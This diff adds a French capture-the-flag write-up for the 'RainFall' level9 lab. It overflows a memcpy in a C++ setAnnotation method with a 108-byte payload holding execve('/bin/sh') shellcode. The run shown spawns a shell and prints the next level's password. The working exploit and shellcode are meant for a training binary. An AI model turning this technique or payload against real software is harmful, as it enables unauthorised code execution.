@@ -1,0 +1,62 @@
+disass main
+
+   0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
+
+disass _ZN1N13setAnnotationEPc
+
+
+   0x0804871a <+12>:	call   0x8048520 <strlen@plt>
+   0x0804871f <+17>:	mov    0x8(%ebp),%edx
+   0x08048722 <+20>:	add    $0x4,%edx
+   0x08048725 <+23>:	mov    %eax,0x8(%esp)
+   0x08048729 <+27>:	mov    0xc(%ebp),%eax
+   0x0804872c <+30>:	mov    %eax,0x4(%esp)
+   0x08048730 <+34>:	mov    %edx,(%esp)
+   0x08048733 <+37>:	call   0x8048510 <memcpy@plt>
+
+
+Nous avons un call a memcpy dans la fonction setAnnotation, on va essayer de l'overflow
+
+
+(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /home/user/level9/level9 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9
+
+Program received signal SIGSEGV, Segmentation fault.
+0x08048682 in main ()
+
+
+Segfault dans le main et plus precisement quand il essaye d'acceder a eax
+
+   0x08048682 <+142>:	mov    (%eax),%edx
+
+
+(gdb) info register
+eax            0x41366441	1094083649
+
+https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/
+
+Offset = 108
+
+L'adresse de eax et mis dans edx, puis un call a edx est execute un peu apres
+
+   0x08048693 <+159>:	call   *%edx
+
+Notre premier caractere sera enregistre sur l'adresse 0x0804a00c (4 bytes de plus que la premiere allocation de malloc (0x0804a008))
+
+On va donc essayer de modifier le call a EDX pour qu'il execute un shellcode
+
+108 (notre offset) - 21 (longeur de notre shellcode)
+
+Adresse de notre string + 4	| 	Shellcode	|	OFFSET	|	Adresse de notre string
+
+`python -c "print '\x10\xa0\x04\x08' + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80' + 'A' * 83 + '\x0c\xa0\x04\x08'"`
+
+
+level9@RainFall:~$ ./level9 `python -c "print '\x10\xa0\x04\x08' + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80' + 'A' * 83 + '\x0c\xa0\x04\x08'"`
+$ cd ../bonus0 && cat .pass
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
+
+
